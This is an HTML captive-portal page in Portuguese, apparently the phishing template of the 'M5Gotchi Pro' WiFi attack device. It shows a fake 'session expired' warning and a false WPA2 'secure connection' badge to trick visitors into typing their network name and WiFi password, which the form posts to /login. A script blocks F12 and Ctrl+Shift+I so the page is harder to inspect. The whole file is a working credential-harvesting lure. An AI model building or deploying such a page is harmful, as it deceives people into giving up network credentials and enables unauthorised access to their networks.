<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 100%;
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
            font-size: 50px;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            text-align: center;
            font-size: 28px;
        }

        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        .footer {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            color: #999;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            margin-top: 15px;
            color: #4CAF50;
            font-size: 12px;
        }

        .alert {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîê</div>
        <h1>WiFi Login</h1>
        <p class="subtitle">Entre com suas credenciais para conectar</p>
        
        <div class="alert">
            ‚ö†Ô∏è Sua sess√£o expirou. Por favor, reconecte-se √† rede.
        </div>

        <form action="/login" method="POST">
            <div class="form-group">
                <label for="ssid">Nome da Rede (SSID)</label>
                <input type="text" id="ssid" name="ssid" placeholder="Ex: MinhaRede_5G" required autocomplete="off">
            </div>

            <div class="form-group">
                <label for="password">Senha da Rede</label>
                <input type="password" id="password" name="password" placeholder="Digite sua senha WiFi" required>
            </div>

            <button type="submit">Conectar √† Rede</button>

            <div class="security-badge">
                üîí Conex√£o Segura ‚Ä¢ Criptografia WPA2
            </div>
        </form>

        <div class="footer">
            M5Gotchi Pro ‚Ä¢ Portal de Autentica√ß√£o WiFi
        </div>
    </div>

    <script>
        // Prevenir F12 e inspe√ß√£o
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
                return false;
            }
        });

        // Adicionar anima√ß√£o no bot√£o
        document.querySelector('button').addEventListener('click', function(e) {
            if (document.querySelector('#ssid').value && document.querySelector('#password').value) {
                this.innerHTML = '‚è≥ Conectando...';
                this.style.background = '#4CAF50';
            }
        });
    </script>
</body>
</html>
